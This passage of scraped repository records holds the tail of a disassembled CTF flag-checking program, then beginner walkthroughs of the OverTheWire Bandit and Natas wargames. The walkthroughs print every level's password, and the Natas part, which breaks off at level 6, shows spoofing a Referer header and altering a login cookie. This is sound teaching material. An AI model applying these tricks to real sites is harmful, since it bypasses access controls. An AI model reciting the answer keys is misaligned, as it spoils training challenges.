TTTTTTAGTAAA     push(#000a8600)\n10d00 : TA               push(pop() == pop())\n10d02 : ATTAAATTGTTT     push(mem[#10a8])\n10d0e : TTTCATGGAGCA     push(#000b652c)\n10d1a : TA               push(pop() == pop())\n10d1c : ATTCAATTGTTT     push(mem[#10ac])\n10d28 : TTTAATCCGTGA     push(#00091f28)\n10d34 : TA               push(pop() == pop())\n10d36 : ATTTCATTGTTT     push(mem[#10b0])\n10d42 : TTGACGCAGAGA     push(#00099b79)\n10d4e : TA               push(pop() == pop())\n10d50 : ATTGCATTGTTT     push(mem[#10b4])\n10d5c : TTAGCAGCACTA     push(#0008edb6)\n10d68 : TA               push(pop() == pop())\n10d6a : ATTACATTGTTT     push(mem[#10b8])\n10d76 : TTTTCTTCGGAA     push(#000a5c30)\n10d82 : TA               push(pop() == pop())\n10d84 : ATTCCATTGTTT     push(mem[#10bc])\n10d90 : TTAAACAGATAA     push(#000a26ea)\n10d9c : TA               push(pop() == pop())\n10d9e : ATTTTCTTGTTT     push(mem[#10c0])\n10daa : TTGATATAGCAA     push(#000ad889)\n10db6 : TA               push(pop() == pop())\n10db8 : TG               push(pop() + pop())\n10dba : TG               push(pop() + pop())\n10dbc : TG               push(pop() + pop())\n10dbe : TG               push(pop() + pop())\n10dc0 : TG               push(pop() + pop())\n10dc2 : TG               push(pop() + pop())\n10dc4 : TG               push(pop() + pop())\n10dc6 : TG               push(pop() + pop())\n10dc8 : TG               push(pop() + pop())\n10dca : TG               push(pop() + pop())\n10dcc : TG               push(pop() + pop())\n10dce : TG               push(pop() + pop())\n10dd0 : TG               push(pop() + pop())\n10dd2 : TG               push(pop() + pop())\n10dd4 : TG               push(pop() + pop())\n10dd6 : TG               push(pop() + pop())\n10dd8 : TG               push(pop() + pop())\n10dda : TG               push(pop() + pop())\n10ddc : TG               push(pop() + pop())\n10dde : TG               push(pop() + pop())\n10de0 : TG               push(pop() + pop())\n10de2 : TG               push(pop() + pop())\n10de4 : TG               push(pop() + pop())\n10de6 : TG               push(pop() + pop())\n10de8 : TG               push(pop() + pop())\n10dea : TG               push(pop() + pop())\n10dec : TG               push(pop() + pop())\n10dee : TG               push(pop() + pop())\n10df0 : TG               push(pop() + pop())\n10df2 : TG               push(pop() + pop())\n10df4 : TG               push(pop() + pop())\n10df6 : TG               push(pop() + pop())\n10df8 : TG               push(pop() + pop())\n10dfa : TG               push(pop() + pop())\n10dfc : TG               push(pop() + pop())\n10dfe : TG               push(pop() + pop())\n10e00 : TG               push(pop() + pop())\n10e02 : TG               push(pop() + pop())\n10e04 : TG               push(pop() + pop())\n10e06 : TG               push(pop() + pop())\n10e08 : TG               push(pop() + pop())\n10e0a : TG               push(pop() + pop())\n10e0c : TG               push(pop() + pop())\n10e0e : TG               push(pop() + pop())\n10e10 : TG               push(pop() + pop())\n10e12 : TG               push(pop() + pop())\n10e14 : TG               push(pop() + pop())\n10e16 : TG               push(pop() + pop())\n10e18 : TTGTCTTTTTTT     push(#00000031)\n10e24 : TA               push(pop() == pop())\n10e26 : CATCCAACTTGT     if (pop() != 1) goto(#10ebc)  if ((((mem[4096] == 692012) + ((mem[4100] == 611030) + ((mem[4104] == 658676) + ((mem[4108] == 556679) + ((mem[4112] == 588728) + ((mem[4116] == 628470) + ((mem[4120] == 659130) + ((mem[4124] == 623012) + ((mem[4128] == 590356) + ((mem[4132] == 670831) + ((mem[4136] == 734960) + ((mem[4140] == 694096) + ((mem[4144] == 673431) + ((mem[4148] == 676517) + ((mem[4152] == 638313) + ((mem[4156] == 730305) + ((mem[4160] == 651347) + ((mem[4164] == 612947) + ((mem[4168] == 614037) + ((mem[4172] == 722768) + ((mem[4176] == 662232) + ((mem[4180] == 608720) + ((mem[4184] == 598699) + ((mem[4188] == 626932) + ((mem[4192] == 659018) + ((mem[4196] == 554138) + ((mem[4200] == 627484) + ((mem[4204] == 620929) + ((mem[4208] == 655810) + ((mem[4212] == 598103) + ((mem[4216] == 664749) + ((mem[4220] == 772833) + ((mem[4224] == 710796) + ((mem[4228] == 669747) + ((mem[4232] == 576742) + ((mem[4236] == 715958) + ((mem[4240] == 682073) + ((mem[4244] == 687276) + ((mem[4248] == 806029) + ((mem[4252] == 660519) + ((mem[4256] == 728567) + ((mem[4260] == 689664) + ((mem[4264] == 746796) + ((mem[4268] == 597800) + ((mem[4272] == 629625) + ((mem[4276] == 585142) + ((mem[4280] == 678960) + ((mem[4284] == 665322) + (mem[4288] == 710793))))))))))))))))))))))))))))))))))))))))))))))))) == 49) != 1) goto #10ebc\n10e32 : TTCTTGTTTTTT     push(#00000043)\n10e3e : TC               print(pop())                  print(chr(67))\n10e40 : TTCCTGTTTTTT     push(#0000004f)\n10e4c : TC               print(pop())                  print(chr(79))\n10e4e : TTATGGTTTTTT     push(#00000052)\n10e5a : TC               print(pop())                  print(chr(82))\n10e5c : TTATGGTTTTTT     push(#00000052)\n10e68 : TC               print(pop())                  print(chr(82))\n10e6a : TTGGTGTTTTTT     push(#00000045)\n10e76 : TC               print(pop())                  print(chr(69))\n10e78 : TTCTTGTTTTTT     push(#00000043)\n10e84 : TC               print(pop())                  print(chr(67))\n10e86 : TTTGGGTTTTTT     push(#00000054)\n10e92 : TC               print(pop())                  print(chr(84))\n10e94 : TTGTATTTTTTT     push(#00000021)\n10ea0 : TC               print(pop())                  print(chr(33))\n10ea2 : TTAATTTTTTTT     push(#0000000a)\n10eae : TC               print(pop())                  print(chr(10))\n10eb0 : GAACGTCCTTGT     goto(#10f1e)                  goto #10f1e\n10ebc : TTCGGGTTTTTT     push(#00000057)\n10ec8 : TC               print(pop())                  print(chr(87))\n10eca : TTATGGTTTTTT     push(#00000052)\n10ed6 : TC               print(pop())                  print(chr(82))\n10ed8 : TTCCTGTTTTTT     push(#0000004f)\n10ee4 : TC               print(pop())                  print(chr(79))\n10ee6 : TTACTGTTTTTT     push(#0000004e)\n10ef2 : TC               print(pop())                  print(chr(78))\n10ef4 : TTCGTGTTTTTT     push(#00000047)\n10f00 : TC               print(pop())                  print(chr(71))\n10f02 : TTGTATTTTTTT     push(#00000021)\n10f0e : TC               print(pop())                  print(chr(33))\n10f10 : TTAATTTTTTTT     push(#0000000a)\n10f1c : TC               print(pop())                  print(chr(10))\n10f1e : CC               halt()\n", "timestamp": "2025-10-24T11:39:36.223713"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/OverTheWire-Bandit/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/OverTheWire-Bandit/README.md", "content": "# OverTheWire-Bandit #\n\n[Website](http://overthewire.org/wargames/bandit/)\n\n[OverTheWire Bandit](http://overthewire.org/wargames/bandit/) is a beginner-oriented wargame teaching / testing the basics of the Linux terminal, `ssh`, Unix/POSIX utilities, and some networking.\n\n## Pre-requisites ##\n\nAll the levels of this wargame are accessed via `ssh`, the secure shell. If you are using any Linux or Mac OS X, you already have `ssh` (and many other terminal utilities) installed.\n\n - Linux - simply open a terminal, commonly hotkeyed to `Ctrl+Alt+T`.\n - Mac OS X - the Terminal.app application is *for our intents and purposes* equivalent to the Linux terminal, and you can find it in `/Applications/Utilities/Terminal.app`.\n - Windows - there are multiple options:\n   - Use [PuTTY](http://www.putty.org/) - PuTTY is a freeware `ssh` client for Windows\n   - Use a Virtual Machine - search for `linux vm on windows`\n   - Use [Cygwin](https://www.cygwin.com/) - Cygwin provides Windows versions of many Linux utilities, including `ssh`.\n\n## Notation used ##\n\nIn the level solutions below, we generally assume you are using `ssh` and a Linux / Mac OS X terminal. There will be blocks of code which you can / should execute in a terminal to clear the level. Once you connect to the Bandit server, you are connected to a Linux machine, so you can execute these commands remotely as well.\n\n - A dollar sign `$` represents user input to the terminal - a command which will run after you type it in and press enter.\n - A pound sign `#` represents other user action.\n - A greater-than sign `>` *describes* some terminal output.\n - Other lines will probably represent what the terminal outputs more literally. There may be some differences when you run commands yourself, or shortcuts to save space.\n\n---\n\n## Challenges ##\n\n - [Level 0](#level-0)\n - [Level 1](#level-1)\n - [Level 2](#level-2)\n - [Level 3](#level-3)\n - [Level 4](#level-4)\n - [Level 5](#level-5)\n - [Level 6](#level-6)\n - [Level 7](#level-7)\n - [Level 8](#level-8)\n - [Level 9](#level-9)\n - [Level 10](#level-10)\n - [Level 11](#level-11)\n - [Level 12](#level-12)\n - [Level 13](#level-13)\n - ...\n\n---\n\n## Level 0 ##\n\n(Login: `bandit0:bandit0`)\n\nTo start this level, simply use your `ssh` client to connect to the given address on the given port. In PuTTY this is configured visually (and labeled clearly).\n\n    $ ssh -p 2220 bandit0@bandit.labs.overthewire.org\n    # input the password bandit0 (it will look like you are not typing, but you are)\n    > a long string of text will inform you that you are connected to Bandit\n\nTo get to the next level, look around the directory you are in and read the file left there. `ls` lists the files in your current directory. `cat` prints out files to the terminal.\n\n    $ ls\n    readme\n    $ cat readme\n    boJ9jbbUNNfktd78OOpsqOltutMc3MY1\n\nAnd there is the password for the next level. To disconnect and terminate our `ssh` session, press `Ctrl+D`.\n\n## Level 1 ##\n\n(Login: `bandit1:boJ9jbbUNNfktd78OOpsqOltutMc3MY1`)\n\nIn this level, there is an awkwardly-named file `-` in the directory.\n\n    $ ls\n    -\n\n`cat -` does not work, because `-` means something special to `cat` (it makes it read from the terminal input). There are multiple ways to solve this problem. Firstly, you can represent the filepath differently.\n\nThere are some special paths in Linux systems:\n\n - `/` is *root* - the filesystem is represented as a tree structure, and it always has (just one) root. Even if there are multiple hard drives installed, they will be mounted on virtual directories that are part of the tree structure.\n - `.` represents the *current directory*. It is often useful when you want to provide the directory you are in as an argument to programs.\n - `..` represents the *parent directory*. `cd ..` takes you to up one level in the filesystem.\n - `~` represents the *user home directory*. User homes are directories which belong to a given user, and their owners (generally) have all permissions in them.\n\nKnowing this, we can represent the file `-` in the current directory as `./-`, which no longer has a special meaning to `cat`:\n\n    $ cat ./-\n    CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n\nThere is one more way, by using *pipes*. Any Linux program / process has a number of open *file descriptors* by default. These are essentially virtual files, which the program can read from or write to:\n\n - `0` / `stdin` - the standard input.\n - `1` / `stdout` - the standard output.\n - `2` / `stderr` - the standard error output.\n\nWhen you run a program in the terminal, what you write gets sent to the program's `stdin`, and the program's `stdout` and `stderr` are printed out in the terminal.\n\nThere are ways to redirect these file descriptors and they provide an extremely powerful way to combine the functionality of various programs.\n\n - `|` (pipe) between two commands redirects the `stdout` of one program to the `stdin` of another.\n - `&gt;` (file output) redirects the `stdout` of a program to a file. Important: the file is completely overwritten with the output.\n - `&gt;&gt;` (file append) redirects the `stdout` of a program to a file. This version keeps the original file contents intact, and appends the data to the end.\n - `&lt;` (file input) redirects a file to the `stdin` of a program.\n\n`cat` with no arguments simply reads data from its `stdin` and outputs it back to its `stdout`. So:\n\n    $ cat < -\n\nWe give `cat` the file on its `stdin`, and it copies it to its `stdout`, which is printed to our terminal.\n\n## Level 2 ##\n\n(Login: `bandit2:CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9`)\n\nWe have to read another file:\n\n    $ ls\n    spaces in this filename\n\nTrying `cat spaces in this filename` directly fails. This is because command-line arguments in the terminal are separated using spaces, so to `cat`, it looks like we are asking it to read the file called \"spaces\", then the file called \"in\", etc. There is a way to specify arguments with spaces in them - we simply need to quote them properly:\n\n    $ cat \"spaces in this filename\"\n    UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n    $ cat 'spaces in this filename'\n    UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\nThere is another way, \"escaping\". Space has special meaning to the terminal, and sometimes we need to use special characters literally (i.e. we want a space to represent a space, not an argument separator). A very common convention is to escape characters using a backslash:\n\n    $ cat spaces\\ in\\ this\\ filename\n    UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\n(If we wanted a literal backslash, that would be `\\\\`.)\n\nA very effective way to make your terminal usage faster in general is to learn to use shortcuts. One of these is `TAB` which in any modern shell (terminal) does \"tab completion\". Whenever you are typing, pressing `TAB` will ask the shell to try to finish what you are typing, with a file or program:\n\n    $ cat sp\n    # now we press TAB and suddenly the terminal shows:\n    $ cat spaces\\ in\\ this\\ filename\n\nIt does all the work for us.\n\n## Level 3 ##\n\n(Login: `bandit3:UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK`)\n\nWe are told there is a hidden file we need to read.\n\n    $ ls\n    inhere\n    $ cd inhere\n    $ ls\n\nBut `ls` shows nothing at all. To find out what a hidden file is, we could search online, or we could see if we can change how `ls` works. Any standard Linux program has a \"man page\" (manual page). It is accessed using the program `man`.\n\n    $ man ls\n    > the manual opens up\n    > press q to quit it, press h for more help, and use the arrows and space for basic navigation\n\nIn the manual, we can find that `ls` takes a special argument (flag), `-a` to \"not ignore entries starting with .\". As it turns out, files whose name starts with `.` are the Linux convention for hidden files. There is nothing special about them, except that they are usually hidden from users. Note that the special directories `.` and `..` also start with a `.` - and they are hidden in `ls` output, even though they are virtually part of every directory.\n\n    $ ls -a\n    .  ..  .hidden\n    $ cat .hidden\n    pIwrPrtPN36QITSp3EQaw936yaFoFgAB\n\n## Level 4 ##\n\n(Login: `bandit4:pIwrPrtPN36QITSp3EQaw936yaFoFgAB`)\n\n    $ ls\n    inhere\n    $ cd inhere\n    $ ls\n    -file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09\n\nWe have a bunch of files, most of which contain binary junk (which can mess up our terminal). We can use the program `file` to identify what each file is. It is useful to identify various forms of data, and it can often provide a reasonable guess. Once again, and argument starting with `-` would be interpreted as a special \"flag\" argument though. Just like in the previous levels, we could prepend `./` to each file and eventually we would find the correct one:\n\n    $ file ./-file00\n    ./-file00: data\n\nBut there is a faster way, using wildcards. These are special character that the shell interprets as \"fill in the blanks\" and expands them to several arguments. For instance:\n\n    $ file ./*\n    ./-file00: data\n    ./-file01: data\n    ./-file02: data\n    ./-file03: data\n    ./-file04: data\n    ./-file05: data\n    ./-file06: data\n    ./-file07: ASCII text\n    ./-file08: data\n    ./-file09: data\n\nWe typed `./*`, meaning \"all files in `.`, the current directory\". `*` would mean the same thing, but we need to prefix the filenames with `./` to not confuse `file`. Note that this wildcard is interpreted by the <i>shell</i> before the program `file` is even run. It \"preprocesses\" the line before it executes it, so `./*` is literally replaced with `./-file00 ./-file01 ./-file02 ... ./-file09`, with the spaces included. `file` has no idea of what a wildcard is. Keep this in mind.\n\n    $ cat ./-file07\n    koReBOKuIDDepwhWk7jZC0RTdopnAYKh\n\n## Level 5 ##\n\n(Login: `bandit5:koReBOKuIDDepwhWk7jZC0RTdopnAYKh`)\n\n    $ ls\n    inhere\n    $ cd inhere\n    $ ls\n    maybehere00  maybehere02  maybehere04  maybehere06  maybehere08  maybehere10  maybehere12  maybehere14  maybehere16  maybehere18\n    maybehere01  maybehere03  maybehere05  maybehere07  maybehere09  maybehere11  maybehere13  maybehere15  maybehere17  maybehere19\n\nThere are a lot of files and we'd like one which is human-readable, 1033 bytes in size, and not executable. Fortunately, there is the command `find`, which allows us to specify various criteria and it will search for conforming files recursively. `man find` gives us some of what we need. As it turns out, specifying the size only (suffixed with `c` to indicate characters or bytes) is enough:\n\n    $ find . -size 1033c\n    ./maybehere07/.file2\n\nWe get one result, which is the correct one. But, if we want to specify the other criteria as well:\n\n    $ find . ! -executable -size 1033c | xargs file\n    ./maybehere07/.file2: ASCII text, with very long lines\n\n`.` is the directory we are searching. `! -executable` means \"not executable\". `-size 1033c` is the size specification.\n\nThe rest is slightly more confusing. We pipe the `stdout` of `find`, which contains lines with one file path on each line. We want to see which files of those are human-readable, which is something `file` can do. Unfortunately, `file` takes arguments, and nothing in `stdin` - `find . | file` does not work because `file` needs an argument. Luckily, there is a command for that. It is `xargs`, and by default it takes lines (or words) from its `stdin` and gives them as arguments to the utility specified in <i>its</i> argument.\n\n    $ cat ./maybehere07/.file2\n    DXjZPULLxYr17uwoI01bNLQbtFemEgo7\n    > (and there is a lot of spaces to make the file 1033 bytes in length)\n\n## Level 6 ##\n\n(Login: `bandit6:DXjZPULLxYr17uwoI01bNLQbtFemEgo7`)\n\nAnother `find` challenge. Consulting `man find` we can use:\n\n    $ find / -user bandit7 -group bandit6 -size 33c\n    > a lot of errors\n\n`find` prints a lot of errors, because we (logged in as the user `bandit6`) do not have the permissions to read or see all the files on the system. The result is hidden among the results, but suppose we wanted to see the output of `find` without all of these errors. As is normal, these errors are actually printed to `stderr`, the error output of `find`. This differentiates errors from data. Basic piping, e.g. using `|` redirects `stdout` to other programs - it could cause problems if we passed lines with errors to other programs which don't know what to do with them. This is why Linux has two different outputs for each process.\n\nThere is more redirection syntax we have not used yet:\n\n - `1>file` redirects `stdout` to `file`.\n - `2>file` redirects `stderr` to `file`.\n\nRecall that the standard file descriptors have numbers, 0-2. In fact, `stdin`, `stdout`, and `stderr` are open by default (hence \"standard\") by the terminal, but there is nothing really special about them - sometimes you can open additional file descriptors for processes, and they would simply be numbered 3 and higher.\n\nThere is no way to \"close\" or \"ignore\" an output. We could redirect `stderr` to a temporary file and then remove it, but in Linux there is already a \"file\" for this - `/dev/null`. It is not really a file, but whatever you write to it is simply lost forever. This is more useful than it sounds in Linux!\n\n    $ find / -user bandit7 -group bandit6 -size 33c 2>/dev/null\n    /var/lib/dpkg/info/bandit7.password\n    $ cat /var/lib/dpkg/info/bandit7.password\n    HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n\n## Level 7 ##\n\n(Login: `bandit7:HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs`)\n\n    $ ls\n    data.txt\n    $ cat data.txt\n    > too much data\n\n(Note: if you ever `cat` a file that seems to go on forever, you can use `Ctrl+C` to terminate the process. `Ctrl+C` works for any process running in the terminal.)\n\nIt is time to use another command - `grep`. According to `man grep`, it searches files for lines which match a pattern. It its simplest form we can just give it a word and it will give us lines which contain that word:\n\n    $ grep millionth data.txt\n    millionth   cvX2JJa4CFALtqS87jk27qwqGhBM9plV\n\n## Level 8 ##\n\n(Login: `bandit8:cvX2JJa4CFALtqS87jk27qwqGhBM9plV`)\n\n    $ ls\n    data.txt\n    $ cat data.txt\n    > too much data again\n\nWe can look at the file `data.txt` with `cat`, although it floods our terminal and it is not always practical. We can use the command `less` to get a less overwhelming look into the data:\n\n    $ cat data.txt | less\n    # navigate the file similarly to man, quit with q, help with h\n\nThere is a lot of similar lines. According to the challenge, there are actually duplicates in this file, but clearly they are not necessarily adjacent. We can sort the lines alphabetically using `sort`.\n\n    $ cat data.txt | sort | less\n\nThis makes the duplicates obvious. Now we need to find lines which are unique. `man uniq` to find:\n\n    $ cat data.txt | sort | uniq -u\n    UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n\nNote that `uniq` only looks for consecutive duplicates. Without sorting the lines first, it would not work.\n\n## Level 9 ##\n\n(Login: `bandit9:UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR`)\n\n    $ ls\n    data.txt\n    $ cat data.txt\n    > binary data, not pretty\n\nThere is a command to extract human-readable ASCII parts from a file, called `strings`.\n\n    $ strings data.txt\n    > still a lot of false positives\n\nWe have another criterion - the password is preceded by several \"=\" characters. `grep` also works on its `stdin`:\n\n    $ strings data.txt | grep ===\n    ========== theOkM\n    ========== password\n    ========== is\n    )========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\n## Level 10 ##\n\n(Login: `bandit10:truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk`)\n\n    $ ls\n    data.txt\n    $ cat data.txt \n    VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==\n\nThe Wikipedia page is helpful, but even without knowing what Base64 really is, we can easily see (`man base64`) that there is a utility to decode it.\n\n    $ base64 -d data.txt\n    The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n\n## Level 11 ##\n\n(Login: `bandit11:IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR`)\n\n    $ ls\n    data.txt\n    $ cat data.txt\n    Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh\n\nOnce again, we can read up about rot-13 and Caesar ciphers on Wikipedia. There is a website dedicated to [rot-13](http://rot13.org/), as well as a more Linux-y way of doing this, using the `tr` utility:\n\n    $ cat data.txt | tr a-zA-Z n-za-mN-ZA-M\n    The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\nTo `tr`, the above is the same as:\n\n    $ cat data.txt | tr abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM\n    The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\nBut we can collapse ranges of consecutive characters. Simply put, whenever `tr` finds a character that is specified in its first argument, it replaces it with the character in the same position in its second argument. Rot-13 replaces each letter of the alphabet with the letter 13 positions down. The above command makes this quite explicit (i.e. an `a` in the first string corresponds to an `n` in the second).\n\n## Level 12 ##\n\n(Login: `bandit12:5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu`)\n\n    $ ls\n    data.txt\n    $ cat data.txt\n    > a hexdump\n\nThe recommended way to do this (according to the challenge) is to create temporary files in `/tmp` and work step by step. The following is a method with no temporary files needed, using only pipes.\n\nDuring this level, we will encounter various data types. Most of these can be identified using `file`. `file` also works on its `stdin`, if it is given `-` as an argument. So the following two are equivalent:\n\n    $ file data.txt \n    data.txt: ASCII text\n    $ cat data.txt | file -\n    /dev/stdin: ASCII text\n\nUsing `file -`, we can always tell what is coming out of our pipe:\n\n\t<li>`xxd` hexdump (ASCII text, identifiable by manual examination)</li>\n\t<li>`gzip` compressed data</li>\n\t<li>`bzip2` compressed data</li>\n\t<li>`tar` archive</li>\n\nFor each of these, we have a decoder command, and a way to process it in pipes. The only slightly more complicated one is `tar`:\n\n\t<li>`xxd -r` reverses its hexdump</li>\n\t<li>`gunzip -` unzips `gzip`</li>\n\t<li>`bunzip2 -` unzips `bzip2`</li>\n\t<li>`tar xfO - &lt;filename&gt;` extracts &lt;filename&gt; from a `tar` archive</li>\n\nGetting started:\n\n    $ cat data.txt | file -\n    /dev/stdin: ASCII text\n    $ cat data.txt | xxd -r | file -\n    /dev/stdin: gzip compressed data, was \"data2.bin\", last modified: Mon Nov 13 14:58:07 2017, max compression, from Unix\n    $ cat data.txt | xxd -r | gunzip - | file -\n    /dev/stdin: bzip2 compressed data, block size = 900k\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | file -\n    /dev/stdin: gzip compressed data, was \"data4.bin\", last modified: Mon Nov 13 14:58:07 2017, max compression, from Unix\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | file -\n    /dev/stdin: POSIX tar archive (GNU)\n\nThe problem with the `tar` format is that it is a multi-file format. In our case, the `tar` archives always contain a single file, but we need to know its name before we can extract it via the pipe stream. We can do this using `tar t`:\n\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar t\n    data5.bin\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar Oxf - data5.bin | file -\n    /dev/stdin: POSIX tar archive (GNU)\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar Oxf - data5.bin | tar t\n    data6.bin\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar Oxf - data5.bin | tar Oxf - data6.bin | file -\n    /dev/stdin: bzip2 compressed data, block size = 900k\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar Oxf - data5.bin | tar Oxf - data6.bin | bunzip2 - | file -\n    /dev/stdin: POSIX tar archive (GNU)\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar Oxf - data5.bin | tar Oxf - data6.bin | bunzip2 - | tar t\n    data8.bin\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar Oxf - data5.bin | tar Oxf - data6.bin | bunzip2 - | tar Oxf - data8.bin | file -\n    /dev/stdin: gzip compressed data, was \"data9.bin\", last modified: Mon Nov 13 14:58:07 2017, max compression, from Unix\n    $ cat data.txt | xxd -r | gunzip - | bunzip2 - | gunzip - | tar Oxf - data5.bin | tar Oxf - data6.bin | bunzip2 - | tar Oxf - data8.bin | gunzip -\n    The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n\n## Level 13 ##\n\n(Login: `bandit13:8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL`)\n\n(TODO!)\n", "timestamp": "2025-10-24T11:39:37.141543"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/OverTheWire-Natas/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/OverTheWire-Natas/README.md", "content": "# OverTheWire-Natas #\n\n[Website](http://overthewire.org/wargames/natas/)\n\n[OverTheWire Natas](http://overthewire.org/wargames/natas/) is a beginner-oriented wargame teaching / testing the basics of web exploitation, PHP scripting, SQL injections, and more.\n\n## Pre-requisites ##\n\nAll the levels of this wargame are accessed via web browser. Any browser has the functionality to display the page source and modify it if needed using the included web developer tools.\n\n - Google Chrome / Chromium\n   - Developer tools - `F12` on Windows, `Cmd-Alt-I` on Mac OS X\n - Firefox\n   - Developer tools - `F12`\n\n---\n\n## Challenges ##\n\n - [Level 0](#level-0)\n - [Level 1](#level-1)\n - [Level 2](#level-2)\n - [Level 3](#level-3)\n - [Level 4](#level-4)\n - [Level 5](#level-5)\n - [Level 6](#level-6)\n - [Level 7](#level-7)\n - [Level 8](#level-8)\n - [Level 9](#level-9)\n - [Level 10](#level-10)\n - [Level 11](#level-11)\n - [Level 12](#level-12)\n - [Level 13](#level-13)\n - [Level 14](#level-14)\n - ...\n\n---\n\n## Level 0 ##\n\n(Login: `natas0:natas0`)\n\nTo start this level, simply navigate your browser to `http://natas0.natas.labs.overthewire.org/`. The username and password are both `natas0`.\n\nThe level is explicit about what to do. After opening the page source, we can find:\n\n    <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->\n\nNote the convention - anything level-related will be inside the `<div id=\"content\">` tag.\n\n## Level 1 ##\n\n(Login: `natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto`)\n\nIn this case there is a JavaScript script (that might not even work on all browsers) blocking right clicks. There are so many ways to circumvent this it is quite useless:\n<ul>\n\t<li>Use a keyboard shortcut\n\t<li>Disable JavaScript\n\t<li>Open web developer tools before navigating to this level\n\t<li>Get the source using `curl` or `wget`\n\t<li>…\n</ul>\n\nArguably Natas is quite old and this level has not aged well.\n\n    <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->\n\n## Level 2 ##\n\n(Login: `natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`)\n\nThe webpage source shows there is an `img` tag displaying an image, but it is a transparent 1x1 PNG, so it is invisible. More importantly, the image is at `files/pixel.png`. It is always worth checking directories - many servers will show a directory listing by default if there is not an `index.html` present (or `index.php` or any other variant).\n\nAfter navigating to `http://natas2.natas.labs.overthewire.org/files/`, we can see another file, `users.txt`, with the password for the next level.\n\n## Level 3 ##\n\n(Login: `natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`)\n\nAnother level that is trivial nowadays. Googling natas3 will reveal the answer immediately, but this was not the original intention. Not to mention googling any of the other level names will give you the answer for that level.\n\nThis level was supposed to work the way it is described - with search engines not being able to find the hidden information. This was accomplished using a `robots.txt` file that would tell web crawlers where to go and where not to go. So, at `http://natas3.natas.labs.overthewire.org/robots.txt`, we see:\n\n    User-agent: *\n    Disallow: /s3cr3t/\n\n(Roughly meaning, no web crawler allowed to crawl the `s3cr3t` directory.)\n\nSo, after checking the directory and the file therein, we find the password for the next level.\n\n## Level 4 ##\n\n(Login: `natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`)\n\nThis level informs us that we are not visiting from the right place. Trying to visit `natas5`, giving it the wrong username and password and then going back does not work, unfortunately.\n\nHTTP is a stateless protocol - every single request-response cycle is a separate connection, data transfer client to server, and data transfer server to client, barring some unimportant details. This means that the \"state\", i.e. which page we come from must be either stored on the server, or given to the server with our request. Fortunately for us, it is the latter. Anything we give to the server we are free to modify if we want to. In particular, we are telling the server where we come from using the HTTP header called `Referer`.\n\nThere are add-ons for Chrome which allow you to modify the HTTP headers. Firefox has this functionality by default in its developer tools. Another way is to use the terminal utility `curl`:\n\n    $ curl --basic --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \\\n      --referer http://natas5.natas.labs.overthewire.org/ \\\n      http://natas4.natas.labs.overthewire.org/\n\n(Note `--basic --user user:password` is required to make sure the server knows we are authenticated.)\n\nThis results in a page which contains the password for the next level.\n\n## Level 5 ##\n\n(Login: `natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`)\n\nIn this level the server complains that we are not logged in. Once again, HTTP is a stateless protocol, so even if the exact information on who is logged in is stored server-side (quite common in practice), we need something to tell the server to look for that information - a cookie. Cookies are given to the browser by the server among its response headers and passed back to the server in the web browser's request headers.\n\nHowever, in this case all the server gave us is a `loggedin` cookie. If we change its value from `0` to `1` and refresh the page, we will get the password for the next level.\n\nChanging cookie values can easily be done in web developer tools. Application -> Storage -> Cookies in Chrome, Storage -> Cookies in Firefox.\n\n## Level 6 ##\n\n(Login: `natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`)\n\nThis level is nice enough to give us its source code, censored slightly.\n\nNote: This will become a common occurrence in natas levels. While a big \"View source\" link is not realistic, having the source code to a piece of software running on a server and trying to work out how to exploit it is quite common.\n\nThis source code is PHP, and it is processed and executed server-side. If the server is configured correctly, accessing a file with a `.php` extension will always result in this 